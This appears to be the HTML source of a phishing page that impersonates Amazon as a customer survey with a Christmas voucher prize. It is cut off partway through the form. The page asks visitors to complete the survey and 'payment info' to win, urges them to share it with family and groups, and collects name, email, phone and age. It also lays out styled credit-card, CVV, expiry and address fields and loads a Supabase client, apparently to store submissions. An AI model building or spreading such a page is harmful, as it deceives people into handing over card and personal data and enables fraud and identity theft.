<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon E-commerce Survey - Win Christmas Voucher!</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f3f4f6;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 30px auto;
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            border-top: 8px solid #FF9900;
        }
        
        .header {
            background: linear-gradient(to right, #232F3E, #131A22);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: #FF9900;
        }
        
        .header h2 {
            font-size: 1.4rem;
            font-weight: 400;
            margin-bottom: 20px;
        }
        
        .incentive {
            background-color: #c51130;
            color: white;
            padding: 15px;
            border-radius: 8px;
            display: inline-block;
            font-weight: bold;
            font-size: 1.2rem;
            margin-top: 10px;
            border: 2px dashed #FF9900;
        }
        
        .form-container {
            padding: 30px;
        }
        
        .section {
            margin-bottom: 35px;
            padding-bottom: 25px;
            border-bottom: 1px solid #eee;
        }
        
        .section-title {
            font-size: 1.3rem;
            color: #232F3E;
            margin-bottom: 20px;
            padding-bottom: 8px;
            border-bottom: 2px solid #FF9900;
            display: flex;
            align-items: center;
        }
        
        .section-title-icon {
            margin-right: 10px;
            font-size: 1.5rem;
        }
        
        .form-group {
            margin-bottom: 25px;
            padding: 15px;
            background-color: #f9f9f9;
            border-radius: 8px;
            border-left: 4px solid #ddd;
        }
        
        .form-group:hover {
            border-left-color: #FF9900;
            background-color: #f5f5f5;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #131A22;
            font-size: 1.05rem;
        }
        
        .question-number {
            background-color: #232F3E;
            color: white;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 0.9rem;
            margin-right: 8px;
        }
        
        input[type="text"],
        input[type="email"],
        input[type="number"],
        input[type="tel"],
        select,
        textarea {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: border 0.3s;
        }
        
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #FF9900;
            box-shadow: 0 0 0 2px rgba(255, 153, 0, 0.2);
        }
        
        .checkbox-group, .radio-group {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 10px;
        }
        
        .checkbox-item, .radio-item {
            display: flex;
            align-items: center;
            margin-right: 20px;
            margin-bottom: 10px;
        }
        
        .checkbox-item input, .radio-item input {
            margin-right: 8px;
            transform: scale(1.2);
        }
        
        .payment-section {
            background-color: #eef7ff;
            padding: 20px;
            border-radius: 8px;
            border-left: 5px solid #232F3E;
        }
        
        .payment-title {
            color: #131A22;
            font-size: 1.2rem;
            margin-bottom: 15px;
        }
        
        .rating {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        
        .rating-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            flex: 1;
        }
        
        .rating-item input {
            margin-bottom: 5px;
            transform: scale(1.3);
        }
        
        .rating-labels {
            display: flex;
            justify-content: space-between;
            width: 100%;
            margin-top: 5px;
            font-size: 0.85rem;
            color: #666;
        }
        
        .submit-btn {
            background: linear-gradient(to right, #FF9900, #ffac31);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 1.2rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            display: block;
            margin: 30px auto 10px;
            width: 250px;
        }
        
        .submit-btn:hover {
            background: linear-gradient(to right, #e68900, #ff9900);
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.3);
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 0.9rem;
            border-top: 1px solid #eee;
        }
        
        .required {
            color: #c51130;
        }
        
        .char-count {
            font-size: 0.8rem;
            color: #666;
            text-align: right;
            margin-top: 5px;
        }
        
        .progress-bar {
            height: 8px;
            background-color: #eee;
            border-radius: 4px;
            margin-bottom: 25px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(to right, #FF9900, #ffac31);
            width: 0%;
            transition: width 0.5s;
        }
        
        .progress-text {
            text-align: center;
            margin-bottom: 10px;
            color: #666;
            font-size: 0.9rem;
        }
        
        .section-counter {
            background-color: #232F3E;
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 0.9rem;
            margin-left: 10px;
        }
        
        /* Credit Card Payment Styles - SIMPLIFIED */
        .payment-card-container {
            background: linear-gradient(135deg, #f5f7fa 0%, #e4edf5 100%);
            border-radius: 20px;
            padding: 30px;
            margin-top: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .payment-card-header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .payment-card-header h3 {
            color: #1a1a1a;
            font-size: 1.8rem;
            margin-bottom: 8px;
        }
        
        .payment-card-header p {
            color: #666;
            font-size: 1rem;
        }
        
        .input-container {
            position: relative;
        }
        
        .payment-input:focus, .payment-select:focus {
            outline: none;
            background-color: white;
            border-color: #FF9900;
            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.1);
        }
        
        .input-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #777;
        }
        
        .form-row {
            display: flex;
            gap: 20px;
        }
        
        .expiry-container, .cvv-container {
            flex: 1;
        }
        
        .expiry-inputs {
            display: flex;
            gap: 10px;
        }
        
        .expiry-inputs select {
            flex: 1;
        }
        
        .cvv-hint {
            position: absolute;
            right: -30px;
            top: 50%;
            transform: translateY(-50%);
            background-color: #333;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 0.8rem;
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
            white-space: nowrap;
        }
        
        .cvv-container:hover .cvv-hint {
            opacity: 1;
        }
        
        .btn-submit-payment {
            background: linear-gradient(135deg, #FF9900 0%, #ffac31 100%);
            color: white;
            border: none;
            padding: 16px 30px;
            border-radius: 10px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-top: 10px;
            letter-spacing: 1px;
        }
        
        .btn-submit-payment:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
        }
        
        .btn-submit-payment:active {
            transform: translateY(0);
        }
        
        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            color: #666;
            font-size: 0.9rem;
            gap: 8px;
        }
        
        .card-info-note {
            font-size: 0.85rem;
            color: #666;
            margin-top: 5px;
            font-style: italic;
            min-height: 20px;
            transition: all 0.3s;
        }
        
        .payment-error {
            color: #eb001b;
            font-size: 0.85rem;
            margin-top: 5px;
            display: none;
        }
        
        .input-container.error input, .input-container.error select {
            border-color: #eb001b;
        }
        
        .card-icons-footer {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 20px;
        }
        
        .card-icon-footer {
            font-size: 1.8rem;
        }
        
        .mastercard-icon-footer {
            color: #eb001b;
        }
        
        .visa-icon-footer {
            color: #1a1f71;
        }
        
        .amex-icon-footer {
            color: #2e77bb;
        }
        
        .discover-icon-footer {
            color: #ff6000;
        }
        
        .jcb-icon-footer {
            color: #003c8f;
        }
        
        .diners-icon-footer {
            color: #0079be;
        }
        
        .unionpay-icon-footer {
            color: #ff0000;
        }
        
        .other-card-icon {
            color: #666;
        }
        
        .address-form {
            margin-top: 20px;
        }
        
        .address-row {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .address-field {
            flex: 1;
        }
        
        .delivery-options {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 15px;
        }
        
        .delivery-option {
            display: flex;
            align-items: center;
            padding: 15px;
            border: 2px solid #e1e5eb;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .delivery-option:hover {
            border-color: #FF9900;
            background-color: rgba(255, 153, 0, 0.05);
        }
        
        .delivery-option.selected {
            border-color: #FF9900;
            background-color: rgba(255, 153, 0, 0.1);
            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.1);
        }
        
        .delivery-icon {
            font-size: 1.5rem;
            margin-right: 15px;
            color: #FF9900;
        }
        
        .delivery-details {
            flex: 1;
        }
        
        .delivery-title {
            font-weight: 600;
            margin-bottom: 5px;
            color: #131A22;
        }
        
        .delivery-description {
            font-size: 0.9rem;
            color: #666;
        }
        
        .gift-message-container {
            margin-top: 20px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* Supabase Loading Overlay Styles */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #FF9900;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        .loading-message {
            color: white;
            margin-top: 20px;
            font-size: 18px;
        }
        
        .success-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 10000;
            justify-content: center;
            align-items: center;
        }
        
        .success-content {
            background: white;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        }
        
        .success-icon {
            font-size: 60px;
            color: #28a745;
            margin-bottom: 20px;
        }
        
        .success-content h3 {
            color: #232F3E;
            margin-bottom: 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Validation Error Styles */
        .error-field {
            border-color: #c51130 !important;
            background-color: #fff5f5 !important;
        }
        
        .error-group {
            border-left-color: #c51130 !important;
            background-color: #fff5f5 !important;
        }
        
        .error-message {
            color: #c51130;
            font-size: 0.85rem;
            margin-top: 5px;
            display: none;
        }
        
        .error-message.show {
            display: block;
        }
        
        .checkbox-group.error, .radio-group.error {
            border: 1px solid #c51130;
            padding: 10px;
            border-radius: 6px;
            background-color: #fff5f5;
        }
        
        @media (max-width: 768px) {
            .container {
                margin: 10px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .checkbox-group, .radio-group {
                flex-direction: column;
                gap: 10px;
            }
            
            .form-container {
                padding: 20px;
            }
            
            .rating {
                flex-wrap: wrap;
            }
            
            .rating-item {
                flex: 0 0 calc(33.333% - 10px);
            }
            
            .form-row, .address-row {
                flex-direction: column;
                gap: 20px;
            }
        }
        
        .optional-note {
            font-size: 0.85rem;
            color: #666;
            font-style: italic;
            margin-top: 5px;
        }
        
        .warning-note {
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 12px;
            border-radius: 6px;
            margin-top: 10px;
            font-size: 0.9rem;
        }
        
        .security-warning {
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
            padding: 15px;
            border-radius: 6px;
            margin: 20px 0;
            text-align: center;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Amazon E-commerce Survey</h1>
            <h2>Take one minute to help us improve your shopping experience</h2>
            <div class="incentive">
                üéÑ Complete survey & payment info to win a FREE Christmas Voucher & Gift! üéÅ<br>
                To increase chances of winning plaese share with friends family and groups<br>
                One of the family can win or a friend 
            </div>
        </div>
        
        <div class="progress-bar">
            <div class="progress" id="surveyProgress"></div>
        </div>
        <div class="progress-text" id="progressText">Section 1 of 12</div>
        
        <form id="amazonSurvey" class="form-container">
            <!-- Personal Information Section -->
            <div class="section" id="section1">
                <h2 class="section-title">
                    <span class="section-title-icon">üë§</span>
                    Personal Information
                    <span class="section-counter">1/12</span>
                </h2>
                
                <div class="form-group">
                    <label for="name"><span class="question-number">1</span> Full Name <span class="required">*</span></label>
                    <input type="text" id="name" name="name" required placeholder="Enter your full name">
                    <div class="error-message" id="name-error">Please enter your full name</div>
                </div>
                
                <div class="form-group">
                    <label for="email"><span class="question-number">2</span> Email Address <span class="required">*</span></label>
                    <input type="email" id="email" name="email" required placeholder="Enter your email address">
                    <div class="error-message" id="email-error">Please enter a valid email address</div>
                </div>
                
                <div class="form-group">
                    <label for="phone"><span class="question-number">3</span> Phone Number <span class="required">*</span></label>
                    <input type="tel" id="phone" name="phone" required placeholder="Enter your phone number">
                    <div class="error-message" id="phone-error">Please enter your phone number</div>
                </div>
                
                <div class="form-group">
                    <label for="age"><span class="question-number">4</span> Age Group <span class="required">*</span></label>
                    <select id="age" name="age" required>
                        <option value="">Select your age group</option>
                        <option value="under18">Under 18</option>
                        <option value="18-25">18-25 years</option>
                        <option value="26-35">26-35 years</option>
                        <option value="36-50">36-50 years</option>
                        <option value="51-65">51-65 years</option>
                        <option value="over65">Over 65</option>
                    </select>
                    <div class="error-message" id="age-error">Please select your age group</div>
                </div>
            </div>
            
            <!-- CUSTOMER EXPERIENCE: General Shopping Experience -->
            <div class="section" id="section2">
                <h2 class="section-title">
                    <span class="section-title-icon">üõçÔ∏è</span>
                    Customer Experience: General Shopping
                    <span class="section-counter">2/12</span>
                </h2>
                
                <div class="form-group">
                    <label><span class="question-number">5</span> How satisfied are you with your overall experience on Amazon? <span class="required">*</span></label>
                    <div class="rating" id="overall_experience_group">
                        <div class="rating-item">
                            <input type="radio" id="overall_1" name="overall_experience" value="1" required>
                            <label for="overall_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="overall_2" name="overall_experience" value="2">
                            <label for="overall_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="overall_3" name="overall_experience" value="3">
                            <label for="overall_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="overall_4" name="overall_experience" value="4">
                            <label for="overall_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="overall_5" name="overall_experience" value="5">
                            <label for="overall_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Dissatisfied</span>
                        <span>Very Satisfied</span>
                    </div>
                    <div class="error-message" id="overall_experience-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">6</span> How easy was it to find what you were looking for? <span class="required">*</span></label>
                    <div class="radio-group" id="find_ease_group">
                        <div class="radio-item">
                            <input type="radio" id="find_easy" name="find_ease" value="very_easy" required>
                            <label for="find_easy">Very Easy</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="find_moderate" name="find_ease" value="moderate">
                            <label for="find_moderate">Moderate</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="find_difficult" name="find_ease" value="difficult">
                            <label for="find_difficult">Difficult</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="find_very_difficult" name="find_ease" value="very_difficult">
                            <label for="find_very_difficult">Very Difficult</label>
                        </div>
                    </div>
                    <div class="error-message" id="find_ease-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">7</span> How would you rate the speed of the website/app? <span class="required">*</span></label>
                    <div class="rating" id="website_speed_group">
                        <div class="rating-item">
                            <input type="radio" id="speed_1" name="website_speed" value="1" required>
                            <label for="speed_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="speed_2" name="website_speed" value="2">
                            <label for="speed_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="speed_3" name="website_speed" value="3">
                            <label for="speed_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="speed_4" name="website_speed" value="4">
                            <label for="speed_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="speed_5" name="website_speed" value="5">
                            <label for="speed_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Slow</span>
                        <span>Very Fast</span>
                    </div>
                    <div class="error-message" id="website_speed-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">8</span> Did you encounter any problems while browsing? <span class="required">*</span></label>
                    <div class="radio-group" id="browsing_problems_group">
                        <div class="radio-item">
                            <input type="radio" id="problems_yes" name="browsing_problems" value="yes" required>
                            <label for="problems_yes">Yes</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="problems_no" name="browsing_problems" value="no">
                            <label for="problems_no">No</label>
                        </div>
                    </div>
                    <div class="optional-note">If yes, please describe in the open-ended section at the end</div>
                    <div class="error-message" id="browsing_problems-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">9</span> How likely are you to shop on Amazon again? <span class="required">*</span></label>
                    <div class="rating" id="shop_again_group">
                        <div class="rating-item">
                            <input type="radio" id="again_1" name="shop_again" value="1" required>
                            <label for="again_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="again_2" name="shop_again" value="2">
                            <label for="again_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="again_3" name="shop_again" value="3">
                            <label for="again_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="again_4" name="shop_again" value="4">
                            <label for="again_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="again_5" name="shop_again" value="5">
                            <label for="again_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Unlikely</span>
                        <span>Very Likely</span>
                    </div>
                    <div class="error-message" id="shop_again-error">Please select a rating</div>
                </div>
            </div>
            
            <!-- Search & Discovery -->
            <div class="section" id="section3">
                <h2 class="section-title">
                    <span class="section-title-icon">üîç</span>
                    Search & Discovery
                    <span class="section-counter">3/12</span>
                </h2>
                
                <div class="form-group">
                    <label><span class="question-number">10</span> How relevant were the search results? <span class="required">*</span></label>
                    <div class="rating" id="search_relevance_group">
                        <div class="rating-item">
                            <input type="radio" id="relevant_1" name="search_relevance" value="1" required>
                            <label for="relevant_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="relevant_2" name="search_relevance" value="2">
                            <label for="relevant_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="relevant_3" name="search_relevance" value="3">
                            <label for="relevant_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="relevant_4" name="search_relevance" value="4">
                            <label for="relevant_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="relevant_5" name="search_relevance" value="5">
                            <label for="relevant_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Not Relevant</span>
                        <span>Very Relevant</span>
                    </div>
                    <div class="error-message" id="search_relevance-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">11</span> Was product information clear and detailed? <span class="required">*</span></label>
                    <div class="radio-group" id="product_info_group">
                        <div class="radio-item">
                            <input type="radio" id="info_yes" name="product_info" value="yes" required>
                            <label for="info_yes">Yes, very clear</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="info_somewhat" name="product_info" value="somewhat">
                            <label for="info_somewhat">Somewhat clear</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="info_no" name="product_info" value="no">
                            <label for="info_no">No, unclear</label>
                        </div>
                    </div>
                    <div class="error-message" id="product_info-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">12</span> Did you use filters or sorting options? <span class="required">*</span></label>
                    <div class="radio-group" id="use_filters_group">
                        <div class="radio-item">
                            <input type="radio" id="filters_yes" name="use_filters" value="yes" required>
                            <label for="filters_yes">Yes</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="filters_no" name="use_filters" value="no">
                            <label for="filters_no">No</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="filters_sometimes" name="use_filters" value="sometimes">
                            <label for="filters_sometimes">Sometimes</label>
                        </div>
                    </div>
                    <div class="error-message" id="use_filters-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">13</span> How satisfied are you with the variety of products available? <span class="required">*</span></label>
                    <div class="rating" id="product_variety_group">
                        <div class="rating-item">
                            <input type="radio" id="variety_1" name="product_variety" value="1" required>
                            <label for="variety_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="variety_2" name="product_variety" value="2">
                            <label for="variety_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="variety_3" name="product_variety" value="3">
                            <label for="variety_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="variety_4" name="product_variety" value="4">
                            <label for="variety_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="variety_5" name="product_variety" value="5">
                            <label for="variety_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Dissatisfied</span>
                        <span>Very Satisfied</span>
                    </div>
                    <div class="error-message" id="product_variety-error">Please select a rating</div>
                </div>
            </div>
            
            <!-- ORDERING & CHECKOUT -->
            <div class="section" id="section4">
                <h2 class="section-title">
                    <span class="section-title-icon">üì¶</span>
                    Ordering & Checkout
                    <span class="section-counter">4/12</span>
                </h2>
                
                <div class="form-group">
                    <label><span class="question-number">14</span> How easy was the checkout process? <span class="required">*</span></label>
                    <div class="rating" id="checkout_ease_group">
                        <div class="rating-item">
                            <input type="radio" id="checkout_1" name="checkout_ease" value="1" required>
                            <label for="checkout_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="checkout_2" name="checkout_ease" value="2">
                            <label for="checkout_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="checkout_3" name="checkout_ease" value="3">
                            <label for="checkout_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="checkout_4" name="checkout_ease" value="4">
                            <label for="checkout_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="checkout_5" name="checkout_ease" value="5">
                            <label for="checkout_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Difficult</span>
                        <span>Very Easy</span>
                    </div>
                    <div class="error-message" id="checkout_ease-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">15</span> Did you find the pricing and fees clear? <span class="required">*</span></label>
                    <div class="radio-group" id="pricing_clarity_group">
                        <div class="radio-item">
                            <input type="radio" id="pricing_yes" name="pricing_clarity" value="yes" required>
                            <label for="pricing_yes">Yes, very clear</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="pricing_somewhat" name="pricing_clarity" value="somewhat">
                            <label for="pricing_somewhat">Somewhat clear</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="pricing_no" name="pricing_clarity" value="no">
                            <label for="pricing_no">No, unclear</label>
                        </div>
                    </div>
                    <div class="error-message" id="pricing_clarity-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">16</span> How satisfied are you with available payment options? <span class="required">*</span></label>
                    <div class="rating" id="payment_options_satisfaction_group">
                        <div class="rating-item">
                            <input type="radio" id="payment_options_1" name="payment_options_satisfaction" value="1" required>
                            <label for="payment_options_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_options_2" name="payment_options_satisfaction" value="2">
                            <label for="payment_options_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_options_3" name="payment_options_satisfaction" value="3">
                            <label for="payment_options_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_options_4" name="payment_options_satisfaction" value="4">
                            <label for="payment_options_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_options_5" name="payment_options_satisfaction" value="5">
                            <label for="payment_options_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Dissatisfied</span>
                        <span>Very Satisfied</span>
                    </div>
                    <div class="error-message" id="payment_options_satisfaction-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">17</span> Did you use any coupons or promotions? <span class="required">*</span></label>
                    <div class="radio-group" id="use_coupons_group">
                        <div class="radio-item">
                            <input type="radio" id="coupons_yes" name="use_coupons" value="yes" required>
                            <label for="coupons_yes">Yes</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="coupons_no" name="use_coupons" value="no">
                            <label for="coupons_no">No</label>
                        </div>
                    </div>
                    <div class="error-message" id="use_coupons-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">18</span> Did you experience any technical issues during checkout? <span class="required">*</span></label>
                    <div class="radio-group" id="checkout_issues_group">
                        <div class="radio-item">
                            <input type="radio" id="tech_issues_yes" name="checkout_issues" value="yes" required>
                            <label for="tech_issues_yes">Yes</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="tech_issues_no" name="checkout_issues" value="no">
                            <label for="tech_issues_no">No</label>
                        </div>
                    </div>
                    <div class="error-message" id="checkout_issues-error">Please select an option</div>
                </div>
            </div>
            
            <!-- Payment Methods Section -->
            <div class="section payment-section" id="section5">
                <h2 class="section-title payment-title">
                    <span class="section-title-icon">üí≥</span>
                    Payment Methods
                    <span class="section-counter">5/12</span>
                </h2>
                <p class="form-group">To help us improve our payment systems, please tell us about your preferred payment methods.</p>
                
                <div class="form-group">
                    <label><span class="question-number">19</span> Which payment format do you always use? <span class="required">*</span></label>
                    <div class="checkbox-group" id="payment_methods_group">
                        <div class="checkbox-item">
                            <input type="checkbox" id="payment_credit" name="payment_methods" value="credit_card">
                            <label for="payment_credit">Credit Card</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="payment_debit" name="payment_methods" value="debit_card">
                            <label for="payment_debit">Debit Card</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="payment_paypal" name="payment_methods" value="paypal">
                            <label for="payment_paypal">PayPal</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="payment_amazonpay" name="payment_methods" value="amazon_pay">
                            <label for="payment_amazonpay">Amazon Pay</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="payment_bank" name="payment_methods" value="bank_transfer">
                            <label for="payment_bank">Bank Transfer</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="payment_cod" name="payment_methods" value="cod">
                            <label for="payment_cod">Cash on Delivery (COD)</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="payment_gift" name="payment_methods" value="gift_card">
                            <label for="payment_gift">Amazon Gift Card</label>
                        </div>
                        <div class="checkbox-item">
                            <input type="checkbox" id="payment_other" name="payment_methods" value="other">
                            <label for="payment_other">Other</label>
                        </div>
                    </div>
                    <div class="error-message" id="payment_methods-error">Please select at least one payment method</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">20</span> How satisfied are you with available payment methods? <span class="required">*</span></label>
                    <div class="rating" id="payment_satisfaction_group">
                        <div class="rating-item">
                            <input type="radio" id="payment_satisfaction_1" name="payment_satisfaction" value="1" required>
                            <label for="payment_satisfaction_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_satisfaction_2" name="payment_satisfaction" value="2">
                            <label for="payment_satisfaction_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_satisfaction_3" name="payment_satisfaction" value="3">
                            <label for="payment_satisfaction_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_satisfaction_4" name="payment_satisfaction" value="4">
                            <label for="payment_satisfaction_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_satisfaction_5" name="payment_satisfaction" value="5">
                            <label for="payment_satisfaction_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Dissatisfied</span>
                        <span>Very Satisfied</span>
                    </div>
                    <div class="error-message" id="payment_satisfaction-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">21</span> How easy was it to add or update a payment method? <span class="required">*</span></label>
                    <div class="rating" id="payment_update_ease_group">
                        <div class="rating-item">
                            <input type="radio" id="update_payment_1" name="payment_update_ease" value="1" required>
                            <label for="update_payment_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="update_payment_2" name="payment_update_ease" value="2">
                            <label for="update_payment_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="update_payment_3" name="payment_update_ease" value="3">
                            <label for="update_payment_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="update_payment_4" name="payment_update_ease" value="4">
                            <label for="update_payment_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="update_payment_5" name="payment_update_ease" value="5">
                            <label for="update_payment_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Difficult</span>
                        <span>Very Easy</span>
                    </div>
                    <div class="error-message" id="payment_update_ease-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">22</span> How satisfied are you with security during payment? <span class="required">*</span></label>
                    <div class="rating" id="payment_security_group">
                        <div class="rating-item">
                            <input type="radio" id="payment_security_1" name="payment_security" value="1" required>
                            <label for="payment_security_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_security_2" name="payment_security" value="2">
                            <label for="payment_security_2">2</label>
